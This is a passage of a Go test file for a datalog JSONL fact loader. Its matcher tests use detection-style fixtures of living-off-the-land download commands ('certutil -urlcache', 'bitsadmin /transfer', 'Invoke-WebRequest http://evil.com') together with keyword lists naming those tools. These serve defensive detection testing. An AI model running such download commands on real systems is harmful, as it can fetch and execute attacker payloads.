package jsonfacts_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"testing/fstest"

	"swdunlop.dev/pkg/datalog"
	"swdunlop.dev/pkg/datalog/jsonfacts"
)

func writeFile(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
}

func writeSchema(t *testing.T, dir string, schema any) {
	t.Helper()
	data, err := json.Marshal(schema)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "schema.json"), data, 0644); err != nil {
		t.Fatal(err)
	}
}

func TestSimpleMapping(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "people.jsonl", `{"name":"tom","age":40,"city":"NYC"}
{"name":"bob","age":30,"city":"SF"}
{"name":"ann","age":25,"city":""}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "people.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "person",
						"args":      []string{"value.name", "value.age"},
					},
					map[string]any{
						"predicate": "lives_in",
						"args":      []string{"value.name", "value.city"},
						"filter":    "value.city != ''",
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	personCount := 0
	for range db.Facts("person", 2) {
		personCount++
	}
	if personCount != 3 {
		t.Errorf("expected 3 person facts, got %d", personCount)
	}

	livesInCount := 0
	for range db.Facts("lives_in", 2) {
		livesInCount++
	}
	if livesInCount != 2 {
		t.Errorf("expected 2 lives_in facts, got %d", livesInCount)
	}
}

func TestImperativeMapping(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "emails.jsonl", `{"sender":"alice","time":"2024-01-01","recipients":["bob","carol"],"attachments":[{"name":"a.pdf","hash":"aaa","size":100},{"name":"b.txt","hash":"bbb","size":200}]}
{"sender":"dave","time":"2024-01-02","recipients":["eve"],"attachments":[{"name":"c.zip","hash":"ccc","size":300}]}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "emails.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `let id = fresh_id();
assert("email", [id, value.sender, value.time]);
map(value.recipients, assert("email_recipient", [id, #]));
map(value.attachments, assert("email_attachment", [id, #.name, #.hash, #.size]))`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	emailCount := 0
	for range db.Facts("email", 3) {
		emailCount++
	}
	if emailCount != 2 {
		t.Errorf("expected 2 email facts, got %d", emailCount)
	}

	recipientCount := 0
	for range db.Facts("email_recipient", 2) {
		recipientCount++
	}
	if recipientCount != 3 {
		t.Errorf("expected 3 email_recipient facts, got %d", recipientCount)
	}

	attachmentCount := 0
	for range db.Facts("email_attachment", 4) {
		attachmentCount++
	}
	if attachmentCount != 3 {
		t.Errorf("expected 3 email_attachment facts, got %d", attachmentCount)
	}

	// Verify ID linkage.
	for row := range db.Query("email", datalog.ID(0), datalog.Variable("S"), datalog.Variable("T")) {
		sender := row[1].(datalog.String)
		if string(sender) != "alice" {
			t.Errorf("email ID 0: expected sender alice, got %s", sender)
		}
	}
}

// TestImperativeMappingErrorAborts confirms that a runtime error raised by an
// imperative Expr mapping on one record is surfaced as a load error (naming
// the file and line) rather than silently dropping the rest of that record's
// asserts and continuing, which would produce an undiagnosed partial load.
func TestImperativeMappingErrorAborts(t *testing.T) {
	dir := t.TempDir()
	// Record 2 (line 2) has only 1 tag, so indexing tags[1] is out of range,
	// which expr-lang raises as a runtime error. Records 1 and 3 are well-formed.
	writeFile(t, dir, "recs.jsonl", `{"id":"r1","tags":["a","b"]}
{"id":"r2","tags":["only-one"]}
{"id":"r3","tags":["c","d"]}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "recs.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `assert("rec", [value.id, value.tags[1]])`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	_, err := cfg.LoadDir(dir)
	if err == nil {
		t.Fatal("expected an error from the record 2 division-by-zero, got nil")
	}
	msg := err.Error()
	if !strings.Contains(msg, "recs.jsonl") || !strings.Contains(msg, "line 2") {
		t.Errorf("expected error naming the file and line 2, got: %v", err)
	}
}

func TestMixedMappings(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"sender":"alice","time":"2024-01-01","tags":["urgent","review"]}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "sender",
						"args":      []string{"value.sender", "value.time"},
					},
					map[string]any{
						"expr": `let id = fresh_id(); map(value.tags, assert("tag", [id, #]))`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	senderCount := 0
	for range db.Facts("sender", 2) {
		senderCount++
	}
	if senderCount != 1 {
		t.Errorf("expected 1 sender fact, got %d", senderCount)
	}

	tagCount := 0
	for range db.Facts("tag", 2) {
		tagCount++
	}
	if tagCount != 2 {
		t.Errorf("expected 2 tag facts, got %d", tagCount)
	}
}

func TestMatchContainsExpr(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "procs.jsonl", `{"id":"alert1","cmd":"cmd.exe /c certutil -urlcache -split"}
{"id":"alert2","cmd":"notepad.exe readme.txt"}
{"id":"alert3","cmd":"powershell Invoke-WebRequest http://evil.com"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "procs.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `assert("proc", [value.id, value.cmd]);
match_contains("cmd_contains", value.id, value.cmd, [
  "certutil", "-urlcache", "Invoke-WebRequest", "wget"
])`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	procCount := 0
	for range db.Facts("proc", 2) {
		procCount++
	}
	if procCount != 3 {
		t.Errorf("expected 3 proc facts, got %d", procCount)
	}

	matchCount := 0
	for range db.Facts("cmd_contains", 2) {
		matchCount++
	}
	if matchCount != 3 {
		t.Errorf("expected 3 cmd_contains facts, got %d", matchCount)
	}
}

func TestPostLoadMatchers(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "procs.jsonl", `{"id":"a1","cmd":"certutil -urlcache"}
{"id":"a2","cmd":"notepad.exe"}
{"id":"a3","cmd":"bitsadmin /transfer"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "procs.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.id", "value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "proc",
				"term":      1,
				"contains":  []string{"certutil", "bitsadmin"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	var matchValues []string
	for row := range db.Facts("contains", 2) {
		matchCount++
		matchValues = append(matchValues, string(row[1].(datalog.String)))
	}
	slices.Sort(matchValues)
	if matchCount != 2 {
		t.Errorf("expected 2 contains facts, got %d", matchCount)
	}
	expected := []string{"bitsadmin", "certutil"}
	if !slices.Equal(matchValues, expected) {
		t.Errorf("expected patterns %v, got %v", expected, matchValues)
	}
}

func TestPostLoadMatcherCIDR(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "ips.jsonl", `{"ip":"10.0.1.5"}
{"ip":"192.168.1.1"}
{"ip":"8.8.8.8"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "ips.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "host",
						"args":      []string{"value.ip"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "host",
				"term":      0,
				"cidr":      []string{"10.0.0.0/8", "192.168.0.0/16"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for range db.Facts("cidr_match", 2) {
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 cidr_match facts, got %d", matchCount)
	}
}

func TestPostLoadMatcherRegex(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"id":"a1","cmd":"ATOMIC-T1053.005_Script.ps1"}
{"id":"a2","cmd":"notepad.exe readme.txt"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.id", "value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":   "proc",
				"term":        1,
				"regex_match": []string{`T[0-9]{4}\.[0-9]{3}`, `ATOMIC-T[0-9]{4}`},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for range db.Facts("regex_match", 2) {
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 regex_match facts, got %d", matchCount)
	}
}

// TestBase64MatcherAllOffsets confirms the base64 matcher finds a plaintext
// pattern base64-encoded at all three byte alignments (0, 1, 2) within
// surrounding, non-plaintext data, and that the fully-determined substrings
// used for matching are exactly the hand-computed values below (i.e. the
// trailing partially-determined character is trimmed along with '=' padding,
// not just the padding).
func TestBase64MatcherAllOffsets(t *testing.T) {
	// "SECRET" base64-encoded at offsets 0, 1, 2 within "...SECRETTAIL12" (offset
	// 0), "X" + "SECRET" + "TAIL12" (offset 1), "XY" + "SECRET" + "TAIL12"
	// (offset 2). These full encodings were computed independently with
	// encoding/base64 and are reproduced verbatim in the JSONL fixture below.
	dir := t.TempDir()
	writeFile(t, dir, "blobs.jsonl", `{"id":"b0","data":"U0VDUkVUVEFJTDEy"}
{"id":"b1","data":"WFNFQ1JFVFRBSUwxMg=="}
{"id":"b2","data":"WFlTRUNSRVRUQUlMMTI="}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "blobs.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "blob",
						"args":      []string{"value.id", "value.data"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "blob",
				"term":      1,
				"base64":    []string{"SECRET"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matched := map[string]bool{}
	for row := range db.Facts("base64_contains", 2) {
		matched[string(row[0].(datalog.String))] = true
	}
	for _, id := range []string{
		"U0VDUkVUVEFJTDEy",     // offset 0
		"WFNFQ1JFVFRBSUwxMg==", // offset 1
		"WFlTRUNSRVRUQUlMMTI=", // offset 2
	} {
		if !matched[id] {
			t.Errorf("expected base64_contains match for %q (SECRET embedded), got matches: %v", id, matched)
		}
	}
	if len(matched) != 3 {
		t.Errorf("expected exactly 3 base64_contains matches, got %d: %v", len(matched), matched)
	}
}

func TestPatternFile(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"cmd":"certutil -urlcache"}
{"cmd":"notepad.exe"}
`)
	writeFile(t, dir, "patterns.txt", `# comment
certutil
bitsadmin
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":     "proc",
				"term":          0,
				"contains_from": "patterns.txt",
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for range db.Facts("contains", 2) {
		matchCount++
	}
	if matchCount != 1 {
		t.Errorf("expected 1 contains fact, got %d", matchCount)
	}
}

func TestMappingValidation(t *testing.T) {
	// Both expr and predicate.
	var cfg1 jsonfacts.Config
	err := json.Unmarshal([]byte(`{
		"sources": [{"file": "data.jsonl", "mappings": [
			{"predicate": "foo", "args": ["value.x"], "expr": "assert(\"foo\", [value.x])"}
		]}]
	}`), &cfg1)
	if err != nil {
		t.Fatal(err)
	}
	if err := cfg1.LoadSchemaFS(fstest.MapFS{}); err == nil {
		// validation happens inside loadSchemaFile, not on direct unmarshal.
		// Test with a schema file instead.
	}

	dir := t.TempDir()
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "foo",
						"args":      []string{"value.x"},
						"expr":      `assert("foo", [value.x])`,
					},
				},
			},
		},
	})
	var cfg2 jsonfacts.Config
	if err := cfg2.LoadSchemaDir(dir); err == nil {
		t.Error("expected error for mapping with both expr and predicate")
	}

	// Neither expr nor predicate.
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{"args": []string{"value.x"}},
				},
			},
		},
	})
	var cfg3 jsonfacts.Config
	if err := cfg3.LoadSchemaDir(dir); err == nil {
		t.Error("expected error for mapping with neither expr nor predicate")
	}
}

func TestEncoder(t *testing.T) {
	decls := []datalog.Declaration{
		{
			Name: "person",
			Terms: []datalog.TermDeclaration{
				{Name: "name"},
				{Name: "age"},
			},
		},
	}

	var buf bytes.Buffer
	enc := jsonfacts.NewEncoder(&buf, decls)

	if err := enc.Encode("person", []datalog.Constant{
		datalog.String("tom"),
		datalog.Integer(40),
	}); err != nil {
		t.Fatal(err)
	}

	if err := enc.Encode("person", []datalog.Constant{
		datalog.String("bob"),
		datalog.Integer(30),
	}); err != nil {
		t.Fatal(err)
	}

	lines := bytes.Split(bytes.TrimSpace(buf.Bytes()), []byte("\n"))
	if len(lines) != 2 {
		t.Fatalf("expected 2 lines, got %d", len(lines))
	}

	var obj map[string]map[string]any
	if err := json.Unmarshal(lines[0], &obj); err != nil {
		t.Fatal(err)
	}
	person, ok := obj["person"]
	if !ok {
		t.Fatal("expected 'person' key")
	}
	if person["name"] != "tom" {
		t.Errorf("expected name tom, got %v", person["name"])
	}
	if person["age"] != float64(40) {
		t.Errorf("expected age 40, got %v", person["age"])
	}
}

func TestEncoderNoDeclaration(t *testing.T) {
	var buf bytes.Buffer
	enc := jsonfacts.NewEncoder(&buf, nil)

	if err := enc.Encode("unknown", []datalog.Constant{
		datalog.String("val1"),
		datalog.Integer(42),
	}); err != nil {
		t.Fatal(err)
	}

	var obj map[string]map[string]any
	if err := json.Unmarshal(buf.Bytes(), &obj); err != nil {
		t.Fatal(err)
	}
	u := obj["unknown"]
	if u["0"] != "val1" {
		t.Errorf("expected key '0' = 'val1', got %v", u["0"])
	}
	if u["1"] != float64(42) {
		t.Errorf("expected key '1' = 42, got %v", u["1"])
	}
}

// TestEncoderManyTermsUsesDecimalKeys confirms termKey formats positional
// keys with proper decimal digits ("10", "11", ...) for arities >= 10,
// instead of the earlier `rune('0'+i)` fallback which emitted punctuation
// characters like ':' and ';' for indices 10 and 11.
func TestEncoderManyTermsUsesDecimalKeys(t *testing.T) {
	var buf bytes.Buffer
	enc := jsonfacts.NewEncoder(&buf, nil)

	row := make([]datalog.Constant, 12)
	for i := range row {
		row[i] = datalog.Integer(int64(i))
	}
	if err := enc.Encode("wide", row); err != nil {
		t.Fatal(err)
	}

	var obj map[string]map[string]any
	if err := json.Unmarshal(buf.Bytes(), &obj); err != nil {
		t.Fatal(err)
	}
	wide, ok := obj["wide"]
	if !ok {
		t.Fatal("expected 'wide' key")
	}
	for _, key := range []string{"10", "11"} {
		if _, ok := wide[key]; !ok {
			t.Errorf("expected key %q in encoded object, got keys %v", key, keysOf(wide))
		}
	}
	for _, bad := range []string{":", ";"} {
		if _, ok := wide[bad]; ok {
			t.Errorf("unexpected punctuation key %q in encoded object", bad)
		}
	}
	if v, ok := wide["11"]; !ok || v != float64(11) {
		t.Errorf(`expected wide["11"] == 11, got %v (ok=%v)`, v, ok)
	}
}

func keysOf(m map[string]any) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	slices.Sort(keys)
	return keys
}

func TestIDType(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"x":"a"}
{"x":"b"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `let id = fresh_id(); assert("item", [id, value.x])`,
					},
				},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	count := 0
	for row := range db.Facts("item", 2) {
		id, ok := row[0].(datalog.ID)
		if !ok {
			t.Errorf("expected first term to be ID, got %T", row[0])
		}
		if id != 0 && id != 1 {
			t.Errorf("unexpected ID %d", id)
		}
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 item facts, got %d", count)
	}
}

func TestWindashMatcher(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"cmd":"cmd.exe /transfer data"}
{"cmd":"cmd.exe -transfer data"}
{"cmd":"notepad.exe"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "proc",
				"term":      0,
				"windash":   true,
				"contains":  []string{"-transfer"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}

	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for row := range db.Facts("wd_contains", 2) {
		pat := string(row[1].(datalog.String))
		if pat != "-transfer" {
			t.Errorf("expected pattern '-transfer', got %q", pat)
		}
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 wd_contains facts, got %d", matchCount)
	}
}

// TestWindashCaseInsensitive confirms that a case-insensitive windash
// matcher still matches regardless of the input's case, and still reports
// the original pattern (not the lower-cased or dash/slash-swapped variant),
// after switching the matcher to use a precomputed lower-cased form instead
// of re-lowering every pattern per fact scanned.
func TestWindashCaseInsensitive(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "data.jsonl", `{"cmd":"CMD.EXE /TRANSFER data"}
{"cmd":"cmd.exe -Transfer data"}
{"cmd":"notepad.exe"}
`)
	writeSchema(t, dir, map[string]any{
		"sources": []any{
			map[string]any{
				"file": "data.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "proc",
						"args":      []string{"value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":        "proc",
				"term":             0,
				"windash":          true,
				"case_insensitive": true,
				"contains":         []string{"-transfer"},
			},
		},
	})

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaDir(dir); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadDir(dir)
	if err != nil {
		t.Fatal(err)
	}

	matchCount := 0
	for row := range db.Facts("ci_wd_contains", 2) {
		pat := string(row[1].(datalog.String))
		if pat != "-transfer" {
			t.Errorf("expected pattern '-transfer', got %q", pat)
		}
		matchCount++
	}
	if matchCount != 2 {
		t.Errorf("expected 2 ci_wd_contains facts (mixed-case /TRANSFER and -Transfer), got %d", matchCount)
	}
}

// --- Bug: buildGateRegex discarded its compile error, and the
// contains/starts_with/ends_with match branches treated a nil gate as "match
// nothing" instead of "no pre-filter" -- so a combined gate pattern large
// enough to exceed regexp's internal program-size limit silently disabled
// matching entirely, with no facts emitted and no error. ---

// oversizedGatePatterns builds a pattern list large enough that its combined
// pre-filter gate regex exceeds regexp's internal program-size limit
// (regexp.Compile returns "expression too large"), plus a trailing "needle"
// pattern to actually match against.
func oversizedGatePatterns() []string {
	const total = 1 << 25
	const per = 64
	pats := make([]string, 0, total/per+1)
	for i := 0; i < total/per; i++ {
		pats = append(pats, fmt.Sprintf("%08d", i)+strings.Repeat("x", per-8))
	}
	pats = append(pats, "needle")
	return pats
}

// TestMatcherGateCompileFailureFallsBackAndWarns covers all three matcher
// kinds whose pre-filter gate shares the "gate == nil || gate.MatchString(s)"
// fallback mechanism in applyMatchers (contains, starts_with, ends_with):
// when the combined gate regex fails to compile, matching must fall back to
// checking every pattern rather than silently matching nothing. Originally
// only the contains branch was regression-tested here, so reverting either
// of the other two branches to "gate != nil && gate.MatchString(s)" (which
// would silently drop every match once a gate fails to compile) went
// uncaught.
func TestMatcherGateCompileFailureFallsBackAndWarns(t *testing.T) {
	cases := []struct {
		name    string
		cmd     string // record value; "needle" must appear per the kind below
		matcher func(pats []string) jsonfacts.Matcher
		pred    string
	}{
		{
			name: "contains",
			cmd:  "run needle now",
			matcher: func(pats []string) jsonfacts.Matcher {
				return jsonfacts.Matcher{Predicate: "proc", Term: 0, Contains: pats}
			},
			pred: "contains",
		},
		{
			name: "starts_with",
			cmd:  "needle runs now",
			matcher: func(pats []string) jsonfacts.Matcher {
				return jsonfacts.Matcher{Predicate: "proc", Term: 0, StartsWith: pats}
			},
			pred: "starts_with",
		},
		{
			name: "ends_with",
			cmd:  "run now needle",
			matcher: func(pats []string) jsonfacts.Matcher {
				return jsonfacts.Matcher{Predicate: "proc", Term: 0, EndsWith: pats}
			},
			pred: "ends_with",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			pats := oversizedGatePatterns()
			dataFS := fstest.MapFS{
				"data.jsonl": {Data: []byte(fmt.Sprintf(`{"cmd":%q}`, tc.cmd) + "\n")},
			}
			cfg := jsonfacts.Config{
				Sources: []jsonfacts.Source{{
					File:     "data.jsonl",
					Mappings: []jsonfacts.Mapping{{Predicate: "proc", Args: []string{"value.cmd"}}},
				}},
				Matchers: []jsonfacts.Matcher{tc.matcher(pats)},
			}
			var warnings []error
			cfg.OnMatcherWarning = func(err error) { warnings = append(warnings, err) }

			db, err := cfg.LoadFS(dataFS)
			if err != nil {
				t.Fatalf("LoadFS: %v", err)
			}
			if len(warnings) == 0 {
				t.Error("expected OnMatcherWarning to fire when the combined gate regex fails to compile")
			}

			matchCount := 0
			for range db.Facts(tc.pred, 2) {
				matchCount++
			}
			if matchCount == 0 {
				t.Errorf("matcher emitted no %s facts when its pre-filter gate failed to compile; "+
					"a gate is only a speedup and must fall back to checking every pattern, not to matching nothing", tc.pred)
			}
		})
	}
}

// TestRegexGateFlagLeak is a regression test for the combined regex_match
// gate joining raw (non-quoted) patterns with "|" directly: an inline flag
// like "(?-i)" in one pattern changed how every later alternate in the same
// combined expression parsed, so the gate rejected a string its own,
// individually-compiled pattern would accept -- silently suppressing a real
// match. Wrapping each alternate in its own non-capturing group scopes the
// inline flag to just that alternate.
func TestRegexGateFlagLeak(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"cmd":"foo"}` + "\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File:     "data.jsonl",
			Mappings: []jsonfacts.Mapping{{Predicate: "proc", Args: []string{"value.cmd"}}},
		}},
		Matchers: []jsonfacts.Matcher{{
			Predicate: "proc", Term: 0, CaseInsensitive: true,
			// The first pattern's "(?-i)" must not affect the second
			// pattern's case-insensitive match against "foo".
			RegexMatch: []string{`a(?-i)b`, `FOO`},
		}},
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("LoadFS: %v", err)
	}
	count := 0
	for range db.Facts("ci_regex_match", 2) {
		count++
	}
	if count == 0 {
		t.Error("expected ci_regex_match for FOO vs foo; the gate's inline-flag leak suppressed it")
	}
}

// --- Bug: a JSONL line with trailing garbage after a valid JSON value
// ("{...} GARBAGE") silently loaded only the leading value and dropped the
// garbage with no error. ---

func TestTrailingGarbageAfterJSONValueErrors(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"cmd":"a"} THIS IS NOT JSON` + "\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File:     "data.jsonl",
			Mappings: []jsonfacts.Mapping{{Predicate: "proc", Args: []string{"value.cmd"}}},
		}},
	}
	_, err := cfg.LoadFS(dataFS)
	if err == nil {
		t.Fatal("expected an error for trailing garbage after a JSON value on a JSONL line, got nil")
	}
	if !strings.Contains(err.Error(), "line 1") {
		t.Errorf("expected the error to report line 1, got: %v", err)
	}
}

// --- Bug: a whitespace-only JSONL line aborted the entire load with a bare
// "EOF" error (there is no JSON value on a blank line to decode), instead of
// being skipped like a truly empty line already was. ---

func TestWhitespaceOnlyLineSkipped(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte("{\"cmd\":\"a\"}\n   \n{\"cmd\":\"b\"}\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File:     "data.jsonl",
			Mappings: []jsonfacts.Mapping{{Predicate: "proc", Args: []string{"value.cmd"}}},
		}},
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("expected a whitespace-only line to be skipped, not abort the load: %v", err)
	}
	count := 0
	for range db.Facts("proc", 1) {
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 proc facts (whitespace-only line skipped), got %d", count)
	}
}

// --- Bug: a UTF-8 byte order mark (EF BB BF) is not Unicode whitespace, so
// bytes.TrimSpace does not strip it. A line containing only a BOM therefore
// reached the JSON decoder as non-blank and aborted the load with a decode
// error instead of being skipped like any other blank line, and a BOM
// prepended to the first line (immediately before a valid JSON object, as
// some JSONL producers emit) made that record fail to decode too. ---

func TestBOMOnlyLineSkipped(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte("{\"cmd\":\"a\"}\n\xEF\xBB\xBF\n{\"cmd\":\"b\"}\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File:     "data.jsonl",
			Mappings: []jsonfacts.Mapping{{Predicate: "proc", Args: []string{"value.cmd"}}},
		}},
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("expected a BOM-only line to be skipped, not abort the load: %v", err)
	}
	count := 0
	for range db.Facts("proc", 1) {
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 proc facts (BOM-only line skipped), got %d", count)
	}
}

func TestLeadingBOMBeforeFirstRecord(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte("\xEF\xBB\xBF{\"cmd\":\"a\"}\n{\"cmd\":\"b\"}\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File:     "data.jsonl",
			Mappings: []jsonfacts.Mapping{{Predicate: "proc", Args: []string{"value.cmd"}}},
		}},
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("expected a leading BOM before the first record not to abort the load: %v", err)
	}
	count := 0
	for range db.Facts("proc", 1) {
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 proc facts (leading BOM stripped from the first record), got %d", count)
	}
}

// --- Bug: a mapping's filter/arg expression that fails to evaluate (e.g. a
// field-name typo) silently dropped the record's fact with no indication
// why. OnMappingError mirrors OnTypeError, giving a caller a hook to observe
// these otherwise-silent drops. ---

func TestOnMappingErrorFiresOnArgEvalError(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"cmd":"a"}` + "\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File: "data.jsonl",
			Mappings: []jsonfacts.Mapping{{
				Predicate: "proc",
				// Indexing past the end of a string is a runtime error in
				// expr (unlike a missing map key, which just yields nil),
				// so this reliably fails to evaluate.
				Args: []string{"value.cmd[5]"},
			}},
		}},
	}
	var mappingErrs []error
	cfg.OnMappingError = func(err error) { mappingErrs = append(mappingErrs, err) }

	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatalf("LoadFS: %v", err)
	}
	if len(mappingErrs) == 0 {
		t.Error("expected OnMappingError to fire for the arg expression evaluation failure")
	}
	count := 0
	for range db.Facts("proc", 1) {
		count++
	}
	if count != 0 {
		t.Errorf("expected 0 proc facts (arg eval failed), got %d", count)
	}
}

func TestOnMappingErrorFiresOnFilterEvalError(t *testing.T) {
	dataFS := fstest.MapFS{
		"data.jsonl": {Data: []byte(`{"cmd":"a"}` + "\n")},
	}
	cfg := jsonfacts.Config{
		Sources: []jsonfacts.Source{{
			File: "data.jsonl",
			Mappings: []jsonfacts.Mapping{{
				Predicate: "proc",
				Args:      []string{"value.cmd"},
				// Indexing past the end of a string is a runtime error in
